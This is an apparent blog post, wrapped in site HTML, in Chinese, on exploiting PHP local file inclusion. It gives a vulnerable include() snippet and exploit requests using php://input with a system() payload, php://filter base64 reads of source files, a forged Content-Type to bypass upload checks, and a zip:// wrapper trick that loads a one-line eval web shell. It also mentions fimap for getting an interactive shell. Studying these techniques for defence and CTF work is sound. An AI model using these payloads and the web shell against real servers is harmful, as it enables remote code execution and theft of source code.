@@ -1,0 +1,370 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>php://input&amp;&amp;php://filter | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：
+index.php:
+
+&amp;lt;?php
+    $b&amp;#x3D;$_REQUEST[&amp;quot;b&amp;quot;];
+    @include($b);
+ ?&amp;gt;
+ 
+EXP:
+
+GET http:&amp;#x2F;&amp;#x2F;evil.com&amp;#x2F;index.php?php:&amp;#x2F;&amp;#x2F;input
+&amp;lt;?php system(&amp;quot;id&amp;quot;)?&amp;gt;
+
+获取文件内容：
+&amp;lt;?php echo file_get_contents(&amp;quot;info.php&amp;quot;);?&amp;gt; &amp;#x2F;&amp;#x2F;测试可用
+&amp;lt;?php echo base64_encode(file_get_contents(&amp;quot;info.php&amp;quot;));?&amp;gt;  &amp;#x2F;&amp;#x2F;http:&amp;#x2F;&amp;#x2F;www.cnblogs.com&amp;#x2F;LittleHann&amp;#x2F;p&amp;#x2F;3665062.html 防止获取&amp;#96;.php&amp;#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来
+
+
+fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
+另外一个php伪协议：
+ 
+file&amp;#x3D;php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;read&amp;#x3D;convert.base64-encode&amp;#x2F;resource&amp;#x3D;image.php
+用来读取php文件。
+ 
+$_FILES[“file”][“type”]这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。
+php的zip伪协议假设有以下的代码：
+file.php:
+
+&amp;lt;?php
+@include($_GET[&amp;#39;a&amp;#39;].&amp;quot;.jpg&amp;quot;);
+@include($_GET[&amp;#39;b&amp;#39;].&amp;quot;.php&amp;quot;);
+
+
+明细的包含，对于参数a和参数b可以这样来解决，比如有一个
+shell.php:
+
+&amp;lt;?php eval($_GET[&amp;#39;c&amp;#39;]);?&amp;gt;
+
+
+a参数最终包含的是一个jpg，b参数是一个php
+对于a来说：
+mv shell.php shell.jpg
+zip a.zip shell.jpg
+
+访问: http:&amp;#x2F;&amp;#x2F;evil.com&amp;#x2F;file.php?a&amp;#x3D;zip:&amp;#x2F;&amp;#x2F;a.zip%23shell&amp;amp;c&amp;#x3D;phpinfo();
+
+对于b来说：
+zip b.zip shell.php
+
+访问: http:&amp;#x2F;&amp;#x2F;evil.com&amp;#x2F;file.php?b&amp;#x3D;zip:&amp;#x2F;&amp;#x2F;b.zip%23shell&amp;amp;c&amp;#x3D;phpinfo();"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="php://input&amp;&amp;php://filter"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> php://input&amp;&amp;php://filter</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p>
+<pre class="line-numbers language-none"><code class="language-none">index.php:
+
+&lt;?php
+    $b&#x3D;$_REQUEST[&quot;b&quot;];
+    @include($b);
+ ?&gt;
+ 
+EXP:
+
+GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
+&lt;?php system(&quot;id&quot;)?&gt;
+
+获取文件内容：
+&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;测试可用
+&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html 防止获取&#96;.php&#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来
+
+
+fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
+另外一个php伪协议：
+ 
+file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
+用来读取php文件。
+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>$_FILES[“file”][“type”]</code><br>这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p>
+<h3 id="php的zip伪协议"><a href="#php的zip伪协议" class="headerlink" title="php的zip伪协议"></a>php的zip伪协议</h3><p>假设有以下的代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">file.php:
+
+&lt;?php
+@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
+@include($_GET[&#39;b&#39;].&quot;.php&quot;);
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p>
+<pre class="line-numbers language-none"><code class="language-none">shell.php:
+
+&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>a参数最终包含的是一个jpg，b参数是一个php</p>
+<pre class="line-numbers language-none"><code class="language-none">对于a来说：
+mv shell.php shell.jpg
+zip a.zip shell.jpg
+
+访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();
+
+对于b来说：
+zip b.zip shell.php
+
+访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>有下面这两个例子：第一个ctf比赛，第二个Metinfo5.3.10版本Getshell：<br><a target="_blank" rel="noopener" href="http://www.venenof.com/index.php/archives/179/">http://www.venenof.com/index.php/archives/179/</a><br><a target="_blank" rel="noopener" href="https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/">https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/</a></p>
+<p>要注意Metinfo5.3.10里面zip的时候带了相对路径，%23后面并没有指定文件，因为压缩的时候带路径，解压缩会自动加上去。</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2016/12/28/php%E7%9A%84zip%E4%BC%AA%E5%8D%8F%E8%AE%AE.html" class="leancloud-visitors view" data-flag-title="php://input&amp;&amp;php://filter">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/01/03/sql中转.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2016/11/08/sql-proxy.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2016-12-28 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Learning/">Learning<span>16</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#php%E7%9A%84zip%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">php的zip伪协议</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
